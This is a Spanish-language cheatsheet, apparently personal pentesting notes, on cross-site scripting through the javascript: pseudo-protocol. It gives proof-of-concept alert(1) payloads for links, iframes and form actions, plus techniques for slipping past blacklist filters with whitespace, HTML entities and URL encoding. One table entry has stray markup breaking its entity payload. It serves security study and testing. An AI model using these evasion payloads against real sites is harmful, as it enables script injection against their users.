---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Pseudo-protocolos (javascript:)

***

## Cheatsheet

|         **Vector / Atributo**          |                                       **Payload de Ejemplo**                                       |                                                                                        **Contexto y Explotación**                                                                                        |
|:--------------------------------------:|:--------------------------------------------------------------------------------------------------:|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
|        <br><br>`href` en `<a>`         |                         <br><br>`<a href="javascript:alert(1)">Click</a>`                          |                                    <br>**Interactivo.** Requiere que la víctima haga clic en el enlace. Es el punto de inyección más común para este esquema.<br><br>                                    |
|      <br><br>`src` en `<iframe>`       |                            <br><br>`<iframe src="javascript:alert(1)">`                            |                             <br>**Automático.** El script se ejecuta inmediatamente cuando el motor del navegador intenta cargar la fuente del marco en el [[DOM]].<br><br>                              |
|      <br><br>`action` en `<form>`      |            <br><br>`<form action="javascript:alert(1)"><button>Enviar</button></form>`             |                       <br>**Interactivo.** La ejecución ocurre en el momento en que se envía el formulario, ya sea por acción del usuario o forzado mediante otro script.<br><br>                        |
|   <br><br>`formaction` en `<button>`   |                 <br><br>`<button formaction="javascript:alert(1)">Click</button>`                  |                               <br>**Interactivo.** Atributo de HTML5 que permite a un botón sobrescribir la URI de destino (`action`) de su formulario contenedor.<br><br>                               |
|   <br><br>Evasión léxica (Espacios)    |                      <br><br>`<a href="java&#x09;script:alert(1)">Click</a>`                       | <br>**Evasión.** Los navegadores ignoran tabulaciones (`&#x09;`), espacios o saltos de línea (`%0A`) insertados antes de los dos puntos del protocolo, rompiendo filtros de coincidencia exacta.<br><br> |
|   <br><br>Evasión vía Entidades HTML   | <br><br>`<a href="&#x6A;&#x61;&#x76;&#x61;&#x73<br><br>;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">` |                          <br>**Evasión.** El contenido de los atributos se decodifica _antes_ de validarse como URL. Ofusca la palabra clave completa frente a un WAF.<br><br>                           |
| <br><br>Ejecución con codificación URL |                 <br><br>`<a href="javascript:%61%6c%65%72%74%28%31%29">Click</a>`                  |                <br>**Evasión.** Todo el bloque de código posterior a los dos puntos puede estar codificado en formato URL (URL encode) para evadir firmas de payloads conocidos.<br><br>                 |

### Inyección en Contextos de Navegación

Si el punto de inyección se encuentra dentro de un atributo que espera una URL, la táctica cambia. En lugar de buscar escapar de la etiqueta cerrándola prematuramente, el objetivo es controlar el esquema de la URI.
- **Control total del atributo:** Si la entrada controla completamente el valor de atributos como `href` o `src`, simplemente inyectar el protocolo inicia la ejecución: `javascript:alert(1)`.
- **Ruptura de rutas relativas:** Si la aplicación antepone una ruta (ej. `<a href="/perfil/INYECCIÓN">`), este vector pierde efectividad directa, ya que el navegador exige que `javascript:` se encuentre al inicio absoluto de la cadena para reconocerlo como un protocolo válido. En estos casos, se debe forzar primero la salida del atributo mediante comillas antes de intentar un nuevo vector.

### Evasión de Filtros Léxicos

Los mecanismos de defensa deficientes suelen basarse en listas negras que buscan la cadena literal `javascript:`. Para evadir estas restricciones, recurro a las particularidades del análisis sintáctico de los navegadores:

- **Inclusión de Espacios en Blanco:** Los navegadores ignoran espacios, tabulaciones y saltos de línea (CR/LF) dentro de la declaración del protocolo antes de los dos puntos.
    - Payload con tabulación: `java&#x09;script:alert(1)`
    - Payload con salto de línea: `java%0Ascript:alert(1)`
- **Codificación de Entidades HTML:** Dado que la inyección ocurre dentro de un atributo HTML (`href`, `src`), el contenido se decodifica _antes_ de evaluar si es una URL válida. Esto me permite ofuscar la palabra clave entera.
    - Payload: `&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)`
- **Codificación URL (URL Encoding):** El cuerpo del script (todo lo que va después de los dos puntos) puede estar codificado para evadir firmas que buscan payloads conocidos como `alert(1)`.
    - Payload: `javascript:%61%6c%65%72%74%28%31%29`


___

## Overview

El uso de pseudo-protocolos, específicamente `javascript:`, es una técnica donde aprovecho la capacidad del navegador para interpretar una URI (Uniform Resource Identifier) como código ejecutable en lugar de una ubicación de red. Cuando el motor del navegador encuentra este esquema en contextos que esperan una URL válida (como enlaces, redirecciones, acciones de formularios o fuentes de incrustación), detiene la navegación estándar y pasa el contenido restante al intérprete de JavaScript.

Este vector es crítico y altamente efectivo cuando la aplicación web filtra proactivamente etiquetas estructurales (como `<script>`) o manejadores de eventos (como `onerror` o `onload`), pero permite a los usuarios suministrar enlaces personalizados, perfiles web o recursos externos.


___
